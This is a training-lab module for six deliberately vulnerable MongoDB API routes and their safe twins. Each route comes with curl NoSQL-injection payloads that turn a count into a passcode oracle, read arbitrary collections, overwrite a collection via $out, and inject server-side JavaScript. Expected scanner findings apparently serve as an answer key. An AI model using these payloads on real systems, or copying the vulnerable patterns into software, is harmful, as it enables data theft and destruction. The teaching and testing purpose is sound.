# Module: Workshop stats (second MongoDB batch)

The stats routes of [the workshop batch](workshop.md) (MONGO-052 to MONGO-057). Techniques demonstrated: a body spread into `count`, a request-chosen collection name, a request-chosen `$out` target, request text interpolated into an `$accumulator` body and into a `mapReduce` body, and a `distinct` field with a raw fallback.

The routes use the native `mongodb` driver against [mongodb-memory-server](https://www.npmjs.com/package/mongodb-memory-server) (MongoDB 8.2.6, loopback, synthetic data). `db.command({ mapReduce })` is used because `collection.mapReduce` does not exist in this driver version. The full answer key is in [workshop.md](workshop.md). Scope: injection only.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [MONGO-052 · A body spread into a count](#mongo-052) | [expected finding](#mongo-052-agent) | [guide](#mongo-052-student) | [Burp · Postman · curl](#mongo-052-exploit) | [comparison](#mongo-052-safe) | [tests](#mongo-052-tests) |
| [MONGO-053 · A request-chosen collection name](#mongo-053) | [expected finding](#mongo-053-agent) | [guide](#mongo-053-student) | [Burp · Postman · curl](#mongo-053-exploit) | [comparison](#mongo-053-safe) | [tests](#mongo-053-tests) |
| [MONGO-054 · A request-chosen $out target](#mongo-054) | [expected finding](#mongo-054-agent) | [guide](#mongo-054-student) | [Burp · Postman · curl](#mongo-054-exploit) | [comparison](#mongo-054-safe) | [tests](#mongo-054-tests) |
| [MONGO-055 · Request text in an $accumulator body](#mongo-055) | [expected finding](#mongo-055-agent) | [guide](#mongo-055-student) | [Burp · Postman · curl](#mongo-055-exploit) | [comparison](#mongo-055-safe) | [tests](#mongo-055-tests) |
| [MONGO-056 · A distinct field with a raw fallback](#mongo-056) | [expected finding](#mongo-056-agent) | [guide](#mongo-056-student) | [Burp · Postman · curl](#mongo-056-exploit) | [comparison](#mongo-056-safe) | [tests](#mongo-056-tests) |
| [MONGO-057 · Request text in a mapReduce body](#mongo-057) | [expected finding](#mongo-057-agent) | [guide](#mongo-057-student) | [Burp · Postman · curl](#mongo-057-exploit) | [comparison](#mongo-057-safe) | [tests](#mongo-057-tests) |

## Safe cases and why they are tricky

| Safe source | Control for | Why it is safe | Wrong reasoning it catches |
| --- | --- | --- | --- |
| `pages/api/workshop/stats/heads.js` | MONGO-052 | Every request value is reduced to text and placed in one fixed field; the team is assigned after. | Reporting a count filter without reading where each value lands. |
| `pages/api/workshop/stats/size.js` | MONGO-053 | The name must be one of two constants, otherwise the default. | Reporting a collection name that depends on the request without reading the allowlist. |
| `pages/api/workshop/stats/export.js` | MONGO-054 | The merge target is reduced to a new collection name of the `copy_` namespace; operators, `$`-prefixed names and existing collections cannot be named. | Reporting every request value near `$merge` without reading the sanitizer. |
| `pages/api/workshop/stats/amount.js` | MONGO-055 | The accumulator body is constant and the value enters as a number argument; text that is not a number becomes `NaN`, not code. | Reporting a request value near `$accumulator` without reading which part is the code. |
| `pages/api/workshop/stats/options.js` | MONGO-056 | The field is one of two constants; an unknown name falls back to the default. | Reporting a map-then-use route without reading the fallback. |
| `pages/api/workshop/stats/loads.js` | MONGO-057 | The JavaScript bodies are constants and the factor enters through `scope` as a number. | Reporting a `mapReduce` with a request value nearby without reading where the value lands. |

## Vulnerable cases that look safe

| Vulnerable source | What looks like a control | Why it is not |
| --- | --- | --- |
| `pages/api/workshop/stats/headcount.js` (MONGO-052) | A fixed `team: 'board'` in the count filter | The spread comes first, so the caller adds conditions to the count — a `$where` string is evaluated as server-side JavaScript, and a pattern turns the count into a per-character oracle on the board secrets. |
| `pages/api/workshop/stats/sample.js` (MONGO-053) | A `limit(1)` and a projection-free read that "only shows the total" | The collection *name* is request text; `?of=people` counts and reads the whole people collection, first document complete with passcode. |
| `pages/api/workshop/stats/snapshot.js` (MONGO-054) | The pipeline stages before `$out` are fixed | `$out` writes the result into the named collection and replaces it; the caller chooses which collection is clobbered. |
| `pages/api/workshop/stats/sum.js` (MONGO-055) | The other three `$accumulator` function texts are constant | The `init` body is a template with the request value inside it — the one place where the value is JavaScript source instead of data. |
| `pages/api/workshop/stats/values.js` (MONGO-056) | An own-key map lookup, like the twin | The fallback hands the raw value to `distinct`, so an unknown field name is used as given. |
| `pages/api/workshop/stats/weights.js` (MONGO-057) | `query` and `reduce` are fixed and the map only "multiplies a factor" | The factor is interpolated into the `map` JavaScript source; text is executed as server-side code. |

---

<a id="mongo-052"></a>
## MONGO-052 · A body spread into a count

<a id="mongo-052-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/headcount.js` |
| Safe control | `pages/api/workshop/stats/heads.js` |
| Route | `POST /api/workshop/stats/headcount` vs `/api/workshop/stats/heads` |
| Flow | body spread before the fixed team → `count` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-052-student) · [Exploit lab](#mongo-052-exploit) · [Vuln vs protected](#mongo-052-safe) · [Tests](#mongo-052-tests)

<a id="mongo-052-student"></a>
### Student guide

A count that returns a number is an oracle: every question you can encode as a filter becomes a yes/no answer. The fixed `team: 'board'` in this route pins *whose* rows are counted, but the body is spread first, so the caller adds any condition — a `$regex` prefix on the passcode, or a `$where` string that MongoDB evaluates as JavaScript on the server. Counting board members whose passcode starts with `ad` returns `1`; with `zz`, `0`. The twin collapses every body value to text in one fixed field.

<a id="mongo-052-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/headcount -H 'Content-Type: application/json' \
  -d '{"passcode":{"$regex":"^ad"}}'
# {"total":1}

curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/headcount -H 'Content-Type: application/json' \
  -d '{"passcode":{"$regex":"^zz"}}'
# {"total":0} — the count answers a pattern question about a secret

curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/heads -H 'Content-Type: application/json' \
  -d '{"passcode":{"$regex":"^ad"}}'
# {"total":0} — "[object Object]" is the login compared
```

**Observation that proves exploitation:** the count flips between `1` and `0` with the pattern — a blind read-out of the stored passcode, one prefix at a time.

<a id="mongo-052-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/headcount.js` | vulnerable | The spread comes first, so the caller adds conditions to the count: `$where` is evaluated as JavaScript, and a pattern turns the count into an oracle on the board secrets. |
| `pages/api/workshop/stats/heads.js` | protected | Every request value is reduced to text and placed in one fixed field; the team is assigned after. |

The control is scoped to this flaw.

<a id="mongo-052-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-053"></a>
## MONGO-053 · A request-chosen collection name

<a id="mongo-053-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/sample.js` |
| Safe control | `pages/api/workshop/stats/size.js` |
| Route | `GET /api/workshop/stats/sample` vs `/api/workshop/stats/size` |
| Flow | query `of` → `db.collection(name)` → `estimatedDocumentCount` and `find` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-053-student) · [Exploit lab](#mongo-053-exploit) · [Vuln vs protected](#mongo-053-safe) · [Tests](#mongo-053-tests)

<a id="mongo-053-student"></a>
### Student guide

The route reads "a total and one row" — but of *which collection* is decided by the `of` parameter, used as the `db.collection()` name with no allowlist. `?of=people` returns the count of people plus their first document whole, passcode included, because the `find` has no projection. The twin checks the name against two constants before using it.

<a id="mongo-053-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same query to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/workshop/stats/sample?of=people'
# total: 2 and rows[0] is the whole admin document, passcode included

curl -s 'http://127.0.0.1:3000/api/workshop/stats/size?of=people'
# the parts branch: total of parts, no person read
```

**Observation that proves exploitation:** the response carries `rows[0].passcode` (`admin-lab-only`) — a full secret document out of a route that answers counts.

<a id="mongo-053-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/sample.js` | vulnerable | The collection name is request text, so the caller reads any collection of the database, whole documents with no projection. |
| `pages/api/workshop/stats/size.js` | protected | The name must be one of two constants, otherwise the default. |

The control is scoped to this flaw.

<a id="mongo-053-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-054"></a>
## MONGO-054 · A request-chosen $out target

<a id="mongo-054-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/snapshot.js` |
| Safe control | `pages/api/workshop/stats/export.js` |
| Route | `POST /api/workshop/stats/snapshot` vs `/api/workshop/stats/export` |
| Flow | body `name` → `$out` collection |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-054-student) · [Exploit lab](#mongo-054-exploit) | [Vuln vs protected](#mongo-054-safe) · [Tests](#mongo-054-tests)

<a id="mongo-054-student"></a>
### Student guide

`$out` is a *write*: the pipeline result replaces the named collection wholesale. All the stages before it are fixed, which reads like a control, but the target is the raw request word — so `{"name":"people"}` overwrites the entire people collection with two rows of parts. The twin sanitises the name to a `copy_` namespace the caller cannot aim at an existing collection: `String`, strip to `a-z`, twelve characters, fixed prefix — and `$merge` into a new collection only writes.

<a id="mongo-054-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes, then read the effect back.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/snapshot -H 'Content-Type: application/json' \
  -d '{"name":"people"}'
# {"saved":"people"} and the people collection now holds listed parts

curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/export -H 'Content-Type: application/json' \
  -d '{"name":"people"}'
# {"saved":"copy_people"} — a new collection, nothing replaced

# Read the effect back: only the snapshot route destroyed the people data.
curl -s 'http://127.0.0.1:3000/api/workshop/people/finder?login=alice'
# after the snapshot call: person null — the row is gone
```

**Observation that proves exploitation:** the read-back returns `person: null` after the snapshot call; after the export call alice is still there.

<a id="mongo-054-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/snapshot.js` | vulnerable | `$out` writes the pipeline result into the named collection and replaces it, so the caller chooses which collection is clobbered. |
| `pages/api/workshop/stats/export.js` | protected | The merge target is reduced to a new collection name of the `copy_` namespace; existing collections cannot be named. |

The control is scoped to this flaw.

<a id="mongo-054-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route (and the read-back) and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-055"></a>
## MONGO-055 · Request text in an $accumulator body

<a id="mongo-055-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/sum.js` |
| Safe control | `pages/api/workshop/stats/amount.js` |
| Route | `POST /api/workshop/stats/sum` vs `/api/workshop/stats/amount` |
| Flow | body `start` → interpolated into the `$accumulator` `init` function text |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-055-student) · [Exploit lab](#mongo-055-exploit) · [Vuln vs protected](#mongo-055-safe) · [Tests](#mongo-055-tests)

<a id="mongo-055-student"></a>
### Student guide

An `$accumulator` is server-side JavaScript in five strings. Four of them are constant in both routes; the difference is where the request value lands. In the vulnerable route the `init` body is a template with `start` inside it, so the value is *code*. `0 + 6 * 7` makes the total start at `42` — arbitrary server-side arithmetic ran (the harmless marker of the JS-002 family). The twin passes the same value through `Number()` into `initArgs` — a data argument — so text that is not a number becomes `NaN`.

<a id="mongo-055-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/sum -H 'Content-Type: application/json' \
  -d '{"start":"0 + 6 * 7"}'
# {"total":48} — the init returned 42 before the quantities (4 + 2 + 1) were added

curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/amount -H 'Content-Type: application/json' \
  -d '{"start":"0 + 6 * 7"}'
# {"total":null} — NaN, not 48
```

**Observation that proves exploitation:** the total proves the init body evaluated the caller's expression (`42 + 7 = 48`), not the string form of the text.

<a id="mongo-055-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/sum.js` | vulnerable | The start value is embedded in the JavaScript source of `init`, so text is evaluated as code. |
| `pages/api/workshop/stats/amount.js` | protected | The accumulator body is constant and the value enters as a number argument; text becomes `NaN`, not code. |

The control is scoped to this flaw.

<a id="mongo-055-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-056"></a>
## MONGO-056 · A distinct field with a raw fallback

<a id="mongo-056-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/values.js` |
| Safe control | `pages/api/workshop/stats/options.js` |
| Route | `GET /api/workshop/stats/values` vs `/api/workshop/stats/options` |
| Flow | query `by` → hasOwn map lookup with a raw fallback → `distinct` field |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-056-student) · [Exploit lab](#mongo-056-exploit) · [Vuln vs protected](#mongo-056-safe) · [Tests](#mongo-056-tests)

<a id="mongo-056-student"></a>
### Student guide

Both routes look up a field name in the same constant map with the same `hasOwn` guard — the difference is the fallback. The twin falls back to a constant; this route falls back to the *raw value*, so any unknown word is used as the `distinct` field as given. `?by=supplier` reads the supplier field, which every other output of this API strips — the same request-controlled-field family as MONGO-018 and MONGO-025 in the first batch, without a single operator in sight.

<a id="mongo-056-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same query to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/workshop/stats/values?by=supplier'
# values: zazzles-supplier-apex, zazzles-supplier-mint — a field no other route returns

curl -s 'http://127.0.0.1:3000/api/workshop/stats/options?by=supplier'
# falls back to bin: the values are bins, no suppliers
```

**Observation that proves exploitation:** the response lists supplier values, a field the API's projections never expose.

<a id="mongo-056-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/values.js` | vulnerable | An unknown `by` falls through to the raw value, so the caller names the field that `distinct` reads. |
| `pages/api/workshop/stats/options.js` | protected | The field is one of two constants; an unknown name falls back to the default. |

The control is scoped to this flaw.

<a id="mongo-056-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-057"></a>
## MONGO-057 · Request text in a mapReduce body

<a id="mongo-057-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/stats/weights.js` |
| Safe control | `pages/api/workshop/stats/loads.js` |
| Route | `POST /api/workshop/stats/weights` vs `/api/workshop/stats/loads` |
| Flow | body `factor` → interpolated into the `mapReduce` `map` text |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-057-student) · [Exploit lab](#mongo-057-exploit) · [Vuln vs protected](#mongo-057-safe) · [Tests](#mongo-057-tests)

<a id="mongo-057-student"></a>
### Student guide

`db.command({ mapReduce, … })` runs the `map` function in the server's JavaScript engine. This route interpolates `factor` into the map source, so `0 + 6 * 7` is code again — every total becomes exactly `42`, proving the caller's expression replaced the multiplication. The twin keeps both JavaScript bodies constant and passes the factor through `scope`, the data channel mapReduce provides for exactly this purpose; `Number()` runs first, so non-numeric text is `NaN`.

<a id="mongo-057-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/weights -H 'Content-Type: application/json' \
  -d '{"factor":"0 + 6 * 7"}'
# every total is 42 — the quantities were multiplied by the caller's expression

curl -s -X POST http://127.0.0.1:3000/api/workshop/stats/loads -H 'Content-Type: application/json' \
  -d '{"factor":"0 + 6 * 7"}'
# the totals are null (NaN), not 42
```

**Observation that proves exploitation:** every emitted value is `42` — the marker of executed server-side arithmetic, not of a multiplication by a text value.

<a id="mongo-057-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/stats/weights.js` | vulnerable | The factor is embedded in the JavaScript source of `map`, so text is evaluated as code. |
| `pages/api/workshop/stats/loads.js` | protected | The JavaScript bodies are constants and the factor enters through `scope` as a number. |

The control is scoped to this flaw.

<a id="mongo-057-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
